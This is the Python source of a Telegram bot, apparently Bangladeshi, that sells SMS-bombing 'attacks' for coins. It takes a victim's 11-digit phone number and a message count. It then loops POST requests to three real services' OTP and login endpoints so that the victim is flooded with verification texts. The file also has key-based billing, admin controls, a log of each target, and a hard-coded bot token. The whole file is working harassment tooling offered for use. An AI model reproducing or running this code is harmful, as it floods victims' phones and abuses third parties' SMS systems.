import telebot
import requests
import json
import os
import time
import threading
import random
import uuid
from telebot import types
from datetime import datetime

# --- কনফিগারেশন ---
TOKEN = "8210992248:AAGA1Oy_UNI75ZbLVdScaB2nzMGyoGLvye4"
ADMIN_ID = 8504263842 
LOG_CHANNEL = "@sMsBotManagerDUModz" 
REQUIRED_CHANNEL = "@DemoTestDUModz" 
LOGO_URL = "https://raw.githubusercontent.com/DarkUnkwonModZ/Blogger-DarkUnkownModZ-Appinfo/refs/heads/main/IMG/dumodz-logo-final.png"

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- ডাটাবেস সিস্টেম (Persistent Storage) ---
def load_db(file):
    if not os.path.exists(file):
        with open(file, 'w') as f: json.dump({}, f)
        return {}
    try:
        with open(file, 'r') as f: return json.load(f)
    except: return {}

def save_db(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=4)

users = load_db('users.json')
keys = load_db('keys.json')

# --- লগিং ফাংশন ---
def send_log(text):
    try:
        bot.send_message(LOG_CHANNEL, f"📜 **Log Update**\n⏰ Time: {datetime.now().strftime('%H:%M:%S')}\n\n{text}")
    except: pass

# --- জয়েন চেক ---
def is_joined(user_id):
    try:
        status = bot.get_chat_member(REQUIRED_CHANNEL, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

# --- ইউজার আপডেট (Anti-Reset System) ---
def update_user(user):
    uid = str(user.id)
    if uid not in users:
        users[uid] = {
            "name": user.first_name,
            "username": f"@{user.username}" if user.username else "N/A",
            "status": "Active", # Active, Blocked, Lifetime
            "coins": 50,
            "sent": 0
        }
        save_db('users.json', users)
        send_log(f"🆕 **New User Registered:**\n👤 Name: {user.first_name}\n🆔 ID: `{uid}`\n💰 Coins: 50")
    return users[uid]

# --- এনিমেশন লোডার ---
def get_loading_anim():
    return random.choice(["⌛", "⏳", "🚀", "⚡", "🔥"])

# --- কমান্ড হ্যান্ডলারস ---

@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.from_user.id)
    u = update_user(message.from_user)
    
    # জয়েন চেক
    if not is_joined(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@','')}"))
        markup.add(types.InlineKeyboardButton("✅ Verify Join", callback_data="verify"))
        bot.send_photo(message.chat.id, LOGO_URL, caption="⚠️ **Access Denied!**\nYou must join our official channel to use this bot.", reply_markup=markup)
        return

    # মেইন মেনু
    show_welcome(message.chat.id, u)

def show_welcome(chat_id, u):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 Start Attack", callback_data="bomb"),
        types.InlineKeyboardButton("👤 Profile", callback_data="profile"),
        types.InlineKeyboardButton("🔑 Use Key", callback_data="use_key"),
        types.InlineKeyboardButton("📢 Support", url="https://t.me/DarkUnkwon")
    )
    bot.send_photo(chat_id, LOGO_URL, caption=f"👋 **Welcome Back, {u['name']}!**\n\n🆔 ID: `{u['status']}`\n💰 Balance: `{u['coins']} Coins`\n📉 Status: `{u['status']}`\n\n_Choose an option below to proceed._", reply_markup=markup)

# --- অ্যাডমিন প্যানেল কমান্ডস ---

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID: return
    help_text = (
        "👑 **Admin Control Panel**\n\n"
        "📊 `/stats` - সিস্টেম স্ট্যাটিসটিকস\n"
        "👥 `/users` - সকল ইউজার লিস্ট\n"
        "⚙️ `/setstatus [ID] [Status]` - স্ট্যাটাস চেঞ্জ (Blocked/Lifetime/Active)\n"
        "💰 `/addcoins [ID] [Amount]` - কয়েন অ্যাড করা\n"
        "🔑 `/gen [Amount]` - রিচার্জ কি তৈরি করা\n"
        "📢 `/broadcast [Message]` - ব্রডকাস্টিং"
    )
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['stats'])
def system_stats(message):
    if message.from_user.id != ADMIN_ID: return
    total_u = len(users)
    total_keys = len(keys)
    bot.reply_to(message, f"📊 **System Stats**\n\n👥 Total Users: {total_u}\n🔑 Unused Keys: {total_keys}\n📡 Status: Server Online")

@bot.message_handler(commands=['users'])
def list_all_users(message):
    if message.from_user.id != ADMIN_ID: return
    text = "👥 **Total User Directory:**\n"
    for uid, data in users.items():
        text += f"\n👤 {data['name']} | ID: `{uid}` | [{data['status']}]"
        if len(text) > 3800:
            bot.send_message(message.chat.id, text)
            text = ""
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['gen'])
def generate_key(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        amount = int(message.text.split()[1])
        new_key = f"DUMODZ-{uuid.uuid4().hex[:8].upper()}"
        keys[new_key] = amount
        save_db('keys.json', keys)
        bot.reply_to(message, f"✅ **Key Generated:**\n`{new_key}`\nValue: {amount} Coins")
    except: bot.reply_to(message, "Usage: `/gen [Amount]`")

@bot.message_handler(commands=['setstatus'])
def change_status(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        args = message.text.split()
        uid, status = args[1], args[2]
        if uid in users:
            users[uid]['status'] = status
            save_db('users.json', users)
            bot.reply_to(message, f"✅ User `{uid}` status updated to `{status}`")
            send_log(f"🛠 Status Updated for `{uid}` to `{status}`")
    except: bot.reply_to(message, "Usage: `/setstatus [ID] [Active/Blocked/Lifetime]`")

# --- কলব্যাক হ্যান্ডলার ---

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    uid = str(call.from_user.id)
    u_data = users.get(uid)

    if call.data == "verify":
        if is_joined(call.from_user.id):
            bot.answer_callback_query(call.id, "✅ Verified! Welcome.")
            bot.delete_message(call.message.chat.id, call.message.message_id)
            show_welcome(call.message.chat.id, u_data)
        else:
            bot.answer_callback_query(call.id, "❌ You haven't joined yet!", show_alert=True)

    elif call.data == "profile":
        text = (f"👤 **User Profile**\n\n"
                f"📝 Name: {u_data['name']}\n"
                f"🆔 ID: `{uid}`\n"
                f"💰 Balance: {u_data['coins']}\n"
                f"🚀 Sent: {u_data['sent']}\n"
                f"🛡 Status: {u_data['status']}")
        bot.send_message(call.message.chat.id, text)

    elif call.data == "use_key":
        msg = bot.send_message(call.message.chat.id, "🔑 **Enter your Recharge Key:**")
        bot.register_next_step_handler(msg, process_key)

    elif call.data == "bomb":
        if u_data['status'] == "Blocked":
            bot.send_message(call.message.chat.id, "🚫 **Account Blocked!**\nPlease contact @DarkUnkwon for help.")
            return
        msg = bot.send_message(call.message.chat.id, "📱 **Enter Target Number (11 Digit):**")
        bot.register_next_step_handler(msg, get_bomb_amount)

# --- লজিক সেকশন ---

def process_key(message):
    uid = str(message.from_user.id)
    key_input = message.text.strip()
    if key_input in keys:
        amount = keys[key_input]
        users[uid]['coins'] += amount
        del keys[key_input]
        save_db('users.json', users)
        save_db('keys.json', keys)
        bot.reply_to(message, f"✅ **Success!** {amount} Coins added to your account.")
        send_log(f"🔑 Key Used by {users[uid]['name']} ({uid})\nKey: `{key_input}`\nAmount: {amount}")
    else:
        bot.reply_to(message, "❌ Invalid or Expired Key!")

def get_bomb_amount(message):
    num = message.text
    if len(num) == 11 and num.isdigit():
        msg = bot.send_message(message.chat.id, "🔢 **Enter SMS Amount (Max 100):**")
        bot.register_next_step_handler(msg, lambda m: start_attack(m, num))
    else:
        bot.send_message(message.chat.id, "❌ Invalid Number! Try again.")

def start_attack(message, num):
    try:
        amount = int(message.text)
        if amount > 100: amount = 100
        uid = str(message.from_user.id)
        cost = 5 # প্রতি রিকোয়েস্টে ৫ কয়েন
        
        if users[uid]['status'] != 'Lifetime' and users[uid]['coins'] < cost:
            bot.send_message(message.chat.id, "⚠️ **Insufficient Coins!**\nYou need 5 coins per attack.")
            return

        # ইনিশিয়াল এনিমেশন
        p_msg = bot.send_message(message.chat.id, "🚀 **Initializing Attack...**")
        time.sleep(1)
        threading.Thread(target=bombing_engine, args=(uid, num, amount, cost, p_msg)).start()
    except:
        bot.send_message(message.chat.id, "❌ Please enter a valid number.")

def bombing_engine(uid, num, amount, cost, p_msg):
    success = 0
    # API List
    apis = [
        "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
        "https://bikroy.com/data/relative/login-with-otp",
        "https://shikho.com/api/auth/v2/send-otp"
    ]
    
    for i in range(1, amount + 1):
        try:
            # আল্ট্রা মোশন এনিমেশন আপডেট
            if i % 5 == 0:
                anim = get_loading_anim()
                bar = "▰" * (i // 10) + "▱" * (10 - (i // 10))
                bot.edit_message_text(f"🚀 **Bombing in Progress...**\n\nTarget: `{num}`\nProgress: `{bar}` {i}%\n{anim} Status: `Sending...`", p_msg.chat.id, p_msg.message_id)
            
            # Request sending
            r = requests.post(random.choice(apis), json={"phone": num, "contact": num, "number": "+88"+num}, timeout=5)
            if r.status_code == 200: success += 1
            time.sleep(0.3)
        except: pass

    # কয়েন ও ডাটা আপডেট
    if users[uid]['status'] != 'Lifetime':
        users[uid]['coins'] -= cost
    users[uid]['sent'] += success
    save_db('users.json', users)
    
    # রেজাল্ট স্ক্রিন
    final_markup = types.InlineKeyboardMarkup()
    final_markup.add(types.InlineKeyboardButton("🚀 Attack Again", callback_data="bomb"))
    
    res_text = (f"✅ **Attack Finished Successfully!**\n\n"
                f"📱 Target: `{num}`\n"
                f"📤 Sent: `{success}/{amount}`\n"
                f"💰 Coins Deducted: `{cost}`\n"
                f"💳 Remaining Balance: `{users[uid]['coins']}`\n\n"
                f"✨ *Powered By DU ModZ*")
    
    bot.edit_message_text(res_text, p_msg.chat.id, p_msg.message_id, reply_markup=final_markup)
    send_log(f"🚀 **Attack Finished!**\nTarget: `{num}`\nSent: `{success}`\nUser: {users[uid]['name']} ({uid})")

# --- বট লঞ্চ ---
if __name__ == "__main__":
    print("--- DU ModZ Bot is Online ---")
    send_log("✅ **Bot Server Started Successfully!**")
    bot.infinity_polling()
